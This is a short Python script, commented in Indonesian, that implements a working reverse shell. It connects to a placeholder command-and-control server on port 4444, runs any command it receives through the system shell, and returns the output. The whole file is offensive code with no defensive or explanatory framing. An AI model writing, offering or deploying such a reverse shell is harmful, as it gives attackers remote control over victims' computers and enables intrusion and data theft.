import socket
import subprocess
import os
import time

def reverse_shell():
    server_ip = 'YOUR_C2_SERVER_IP'  # Gantilah dengan IP server C2 (Command and Control)
    server_port = 4444                # Port yang digunakan untuk komunikasi

    # Membuat soket untuk koneksi
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.connect((server_ip, server_port))
        print(f"Connected to C2 server at {server_ip}:{server_port}")

        while True:
            # Menerima perintah dari server C2
            command = sock.recv(1024).decode('utf-8')
            if command.lower() == 'exit':
                sock.close()
                break

            # Menjalankan perintah yang diterima di sistem target
            output = subprocess.run(command, shell=True, capture_output=True)
            sock.send(output.stdout + output.stderr)

    except Exception as e:
        print(f"Error during reverse shell: {e}")
        sock.close()

if __name__ == "__main__":
    reverse_shell()
